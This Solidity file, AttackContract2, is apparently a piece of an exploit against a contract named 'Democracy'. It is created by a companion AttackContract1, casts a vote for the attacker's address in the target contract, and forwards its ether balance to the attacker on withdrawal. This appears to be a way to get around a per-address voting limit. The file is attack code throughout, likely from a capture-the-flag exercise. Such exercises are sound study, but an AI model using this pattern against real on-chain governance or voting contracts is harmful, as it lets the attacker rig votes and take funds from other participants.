// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

import "./Democracy.sol";
import "./AttackContract1.sol";

contract AttackContract2 {
    Democracy public democracy;
    AttackContract1 public attackContract1;
    address public attacker;

    constructor() {
        attackContract1 = AttackContract1(payable(msg.sender));
        democracy = attackContract1.democracy();
        attacker = attackContract1.attacker();
    }

    function vote() public {
        democracy.vote(attacker);
    }

    function withdraw() public {
        require(msg.sender == address(attackContract1));
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {}
}